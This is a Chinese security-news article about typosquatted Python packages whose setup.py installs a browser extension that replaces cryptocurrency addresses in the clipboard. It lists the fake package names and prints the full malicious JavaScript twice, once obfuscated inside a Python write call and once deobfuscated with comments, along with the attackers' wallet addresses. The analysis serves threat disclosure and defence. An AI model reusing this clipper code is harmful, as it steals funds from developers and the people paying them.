---
title: 恶意Python软件包替换开发者剪贴板中的加密货币地址
url: https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247557804&idx=2&sn=c7769927a8565ebe587f5c936c6039db&chksm=e9143296de63bb80549c7fbcbc94d96023455e64727a043a96efbf4a34ff0e638481b64c8e68&scene=58&subscene=0#rd
source: 嘶吼专业版
date: 2023-02-21
fetch_date: 2025-10-04T07:39:03.455588
---

# 恶意Python软件包替换开发者剪贴板中的加密货币地址

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFHvF3uydqKiatc9ZWWEgq57smFsYqbic6cydrs8MNNeZDQibbAevMRMzgQ/0?wx_fmt=jpeg)

# 恶意Python软件包替换开发者剪贴板中的加密货币地址

布加迪

嘶吼专业版

![](https://mmbiz.qpic.cn/mmbiz_gif/wpkib3J60o297rwgIksvLibPOwR24tqI8dGRUah80YoBLjTBJgws2n0ibdvfvv3CCm0MIOHTAgKicmOB4UHUJ1hH5g/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFbx70jyicKibohF8oDC67IczicgoPQmV59m6AwPGWxQYD7SRRcbG1eG6uw/640?wx_fmt=jpeg)

我们Phylum发现了数十个针对开发者的域名误植软件包后不到一周，我们的自动化风险平台发现了另一起针对开发者及其加密货币的新兴活动所涉及的另外几个软件包。这起攻击活动针对的软件包每天下载量超过2900万人次，这个潜在的覆盖范围对攻击者来说很庞大，为利用开发者的拼写错误提供了大好机会！

这起进行中的攻击活动涉及的当前软件包如下所示：

baeutifulsoup4

beautifulsup4

cloorama

cryptograpyh

crpytography

djangoo

hello-world-exampl

hello-world-example

ipyhton

mail-validator

mariabd

mysql-connector-pyhton

notebok

pillwo

pyautogiu

pygaem

pytorhc

python-dateuti

python-flask

python3-flask

pyyalm

rqeuests

slenium

sqlachemy

sqlalcemy

tkniter

urlllib

安装完成后，一个恶意的Javascript文件会被投放到系统中，并在任何互联网浏览会话的后台执行。当开发者复制加密货币地址时，剪贴板中的地址被替换成了攻击者的地址。

在撰写本文时（第一个恶意软件包发布大约一小时后），这些软件包已下载了100多次。虽然我们报告了这每一个软件包（以后会继续报告），但我们预计在接下来的几小时内，下载数量和软件包总数量都将会攀升。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFoZB8aIkibmApic46wGzRYlh6rvwmsKk3rNKDkxIeSG8grgDErfFTGLVA/640?wx_fmt=png)
   从Python投放经过混淆处理的JavaScript

来自这每一个软件包的恶意载荷都存在于setup.py中。恶意软件的编写者从获得一份“值得关注”的路径列表开始入手：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFDVpLd015rLGGWbiaIaicXwhsPIbf0hJfU5f0Fibs6PGJOQ0a4SCLnkMEQ/640?wx_fmt=png)

最后，攻击者将经过混淆处理的Javascript写入到$APPDATA\\Extension文件夹：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFU38FIKPciaHaTDZjqrR8EtT90h2GE9Ticz5Md7cS6WJmLzArckN0aicGA/640?wx_fmt=png) with   open(appDataPath + '\\Extension\\background.js', 'w+') as extensionFile:

    extensionFile.write('''var   \_0x327ff6=\_0x11d4;(function(\_0x314c14,\_0x4da2d4){var   \_0x4d9550=\_0x11d4,\_0x41c8ae=\_0x314c14();while(!![]){try{var   \_0x291238=parseInt(\_0x4d9550(0x83))/0x1+parseInt(\_0x4d9550(0x87))/0x2\*(-parseInt(\_0x4d9550(0x7c))/0x3)+-parseInt(\_0x4d9550(0x81))/0x4\*(-parseInt(\_0x4d9550(0x8b))/0x5)+parseInt(\_0x4d9550(0x7e))/0x6\*(parseInt(\_0x4d9550(0x75))/0x7)+-parseInt(\_0x4d9550(0x89))/0x8+-parseInt(\_0x4d9550(0x85))/0x9+parseInt(\_0x4d9550(0x82))/0xa;if(\_0x291238===\_0x4da2d4)break;else   \_0x41c8ae['push'](\_0x41c8ae['shift']());}catch(\_0x435e56){\_0x41c8ae['push'](\_0x41c8ae['shift']());}}}(\_0x7dfe,0x8e72d));let   page=chrome[\_0x327ff6(0x77)][\_0x327ff6(0x76)]();function   \_0x11d4(\_0x5d4133,\_0x41221d){var \_0x7dfebe=\_0x7dfe();return   \_0x11d4=function(\_0x11d4f7,\_0x3282ea){\_0x11d4f7=\_0x11d4f7-0x75;var   \_0x34f11d=\_0x7dfebe[\_0x11d4f7];return   \_0x34f11d;},\_0x11d4(\_0x5d4133,\_0x41221d);}var   inputElement=document[\_0x327ff6(0x88)](\_0x327ff6(0x8a));document['body'][\_0x327ff6(0x86)](inputElement),inputElement['focus']();function   check(){var \_0xe8a3e=\_0x327ff6;document[\_0xe8a3e(0x79)](\_0xe8a3e(0x7f));var   \_0x5eb90d=inputElement[\_0xe8a3e(0x7a)];\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^(0x)[a-fA-F0-9]{40}$/,'0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^T[A-Za-z1-9]{33}$/,'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^(bnb1)[0-9a-z]{38}$/,\_0xe8a3e(0x80)),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),\_0x5eb90d=\_0x5eb90d[\_0xe8a3e(0x78)](/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,\_0xe8a3e(0x84)),inputElement['value']=\_0x5eb90d,inputElement[\_0xe8a3e(0x7d)](),document['execCommand'](\_0xe8a3e(0x7b)),inputElement[\_0xe8a3e(0x7a)]='';}function   \_0x7dfe(){var   \_0x1c8730=['8bkbJpt','14903530AaRyNg','646317UWotJX','LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq','9448686izWZHq','appendChild','2hKfLTM','createElement','3544256zMWJYQ','textarea','10470IXKEdo','42UUKWJT','getBackgroundPage','extension','replace','execCommand','value','copy','1539693aOTNUd','select','448728VNjtMg','paste','bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'];\_0x7dfe=function(){return   \_0x1c8730;};return \_0x7dfe();}setInterval(check,0x3e8);''')

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFmlFt4MCrkCV7bmx30Pfon23icQkH1FOiag6VziceAC5ibqAjmb24mKWSwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFJFcf9ZWgI7sqd5wynA4QxlDo8zTQzB51r3X2VMQ18LSTuC6Pibb7fAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFoZB8aIkibmApic46wGzRYlh6rvwmsKk3rNKDkxIeSG8grgDErfFTGLVA/640?wx_fmt=png)
   对Javascript代码反混淆处理

为了企图隐藏恶意载荷执行的操作，攻击者使用常见的混淆器对Javascript进行混淆处理。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFWjFXlicoCia6vljGshqu2NAaM91YjqNOfiaWibsPwf1xBEL5SUtZibUcC9Q/640?wx_fmt=png)

图1

虽然我们可以根据manifest.json中请求的权限推断出这个恶意软件包执行的操作，还是不妨对它进行反混淆处理，确保有把握。注释已添加。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFU38FIKPciaHaTDZjqrR8EtT90h2GE9Ticz5Md7cS6WJmLzArckN0aicGA/640?wx_fmt=png) /\*\*

 \* Returns the Window of the background page   if the background script is running.

 \* If the script is not running, null is   returned.

 \*/

let   page = chrome['extension']['getBackgroundPage']();

//   Create a new text area on the page

var   textareaElement = document.createElement('textarea');

document['body']['appendChild'](textareaElement);

//   Then focus on it

textareaElement['focus']();

function   lookforCryptoAddresses() {

    // The input element is on our newly   defined element and we paste whatever is in the

    // clipboard to it.

    document['execCommand']('paste');

    // We then get the value of what we just   pasted in the text area.

    var inputValue =   textareaElement['value'];

    /\*\* Look at the value, if it matches one   of the regexes replace the crypto address \*\*/

    // ETH addresses

    inputValue =   inputValue.replace(/^(0x)[a-fA-F0-9]{40}$/,   '0x18c36eBd7A5d9C3b88995D6872BCe11a080Bc4d9'),

              // TRX (TRON) address

              inputValue =   inputValue.replace(/^T[A-Za-z1-9]{33}$/,   'TWStXoQpXzVL8mx1ejiVmkgeUVGjZz8LRx'),

              // BNB Address

              inputValue =   inputValue.replace(/^(bnb1)[0-9a-z]{38}$/,   'bnb1cm0pllx3c7e902mta8drjfyn0ypl7ar4ty29uv'),

              // BTC Address

              inputValue =   inputValue.replace(/^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$/,   'bc1qqwkpp77ya9qavyh8sm8e4usad45fwlusg7vs5v'),

              // LTC Address

              inputValue =   inputValue.replace(/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/,   'LPDEYUCna9e5dYaDPYorJBXXgc43tvV9Rq'),

    // Update the text area to the value we   replaced above.

    textareaElement['value'] = inputValue,

    //   Select whatever is in the text area.

    textareaElement['select'](),

    // Copy that to the clipboard, thereby   overwriting the address the user copied.

    document['execCommand']('copy'),

    // Clear the text area.

    textareaElement['value'] = '';

}

//   Monitor the clipboard every second.

setInterval(lookforCryptoAddresses,   1000);

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFmlFt4MCrkCV7bmx30Pfon23icQkH1FOiag6VziceAC5ibqAjmb24mKWSwA/640?wx_fmt=png)

大致而言，攻击者：

在页面上创建textarea（文本区域）。

将任何剪贴板内容粘贴到文本区域。

使用一系列正则表达式来搜索常见的加密货币地址格式。

用先前创建的textarea中攻击者控制的地址替换任何已识别的地址。

将textarea复制到剪贴板。

如果受攻击的开发者在任何时间复制钱包地址，恶意软件包将用攻击者控制的地址替换该地址。这种秘密的查找/替换会导致最终用户无意中将其资金发送给攻击者。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFoZB8aIkibmApic46wGzRYlh6rvwmsKk3rNKDkxIeSG8grgDErfFTGLVA/640?wx_fmt=png)
   攻击者控制的钱包

攻击者控制的当前地址列表为：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFY27ZZ8waQcDeoZUm8P2Liaab8Dezyqecjk6IMRtbJyPoLiaKUKzic0KVg/640?wx_fmt=png)

在撰写本文时，还没有资金被转移到攻击者。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o28LNiaAkLylOdSwQ4WdtePOFricoUtm45jfT2w6yQc1tibFwD6ibKzA0hKpRnGU...